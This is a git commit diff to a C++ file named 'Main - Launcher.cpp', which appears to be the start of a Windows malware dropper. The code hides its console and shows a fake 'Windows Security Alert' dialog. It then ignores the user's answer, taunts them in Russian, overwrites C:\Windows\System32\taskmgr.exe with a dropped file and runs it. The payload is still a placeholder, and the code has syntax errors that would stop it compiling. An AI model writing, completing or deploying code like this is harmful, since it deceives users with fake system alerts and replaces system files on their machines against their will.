555039493f3d8f09d45a996d6fb110ae8cbaa1b8
СтранныйРусский <87149262+LukeChemeriov@users.noreply.github.com>
2021-10-02 17:55:04 +0100

    Update Main - Launcher.cpp
    Changed to overwrite taskmgr and changed the message box structure

--- Main - Launcher.cpp
+++ Main - Launcher.cpp
@@ -3,8 +3,7 @@
 
 void dropFile() {
     const char* data = "this will soon contain the base64 of the file";
-    const char* path = "C:\\Windows\\System32";
-    ofstream File(path + "taskmgr.exe");
+    ofstream File("C:\\Windows\\System32\\" + "taskmgr.exe");
     File << data;
     File.close();
     system("start C:\\Windows\\System32\\taskmgr.exe");
@@ -12,20 +11,12 @@ void dropFile() {
 
 
 int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance,
-                            LPSTR lpszArgument, int nFunsterStil)
-
-{
+                            LPSTR lpszArgument, int nFunsterStil)  {
      HWND hide; 
      AllocConsole();
-     hide = FindWindowA("ConsoleWindowClass", NULL);
-     ShowWindow(hide, 0);
-     int db = MessageBox( NULL, L"Windows Management Server has started! \nWish you to continue?", L"WINMANAGE", MB_YESNO | MB_ICONERROR ); //db for dialog box in case you're wondering
-     switch (db) {
-          case ID_YES:
-               dropFile();
-          case ID_NO:
-               MessageBox( NULL, "И? Почему меня должно волновать, что ты думаешь?", "SCREW YOU!", MB_OK | MB_ICONERROR );
-               dropFile();
-     }
+     ShowWindow(FindWindowA("ConsoleWindowClass", NULL);, 0);
+     MessageBox( NULL, L"Windows Security Server has started! \nWish you to continue?", L"Windows Security Alert", MB_YESNO | MB_ICONERROR ); //db for dialog box in case you're wondering
+     MessageBox( NULL, "И? Почему меня должно волновать, что ты думаешь?", "SCREW YOU!", MB_OK | MB_ICONERROR );
+     dropFile();
 }
           
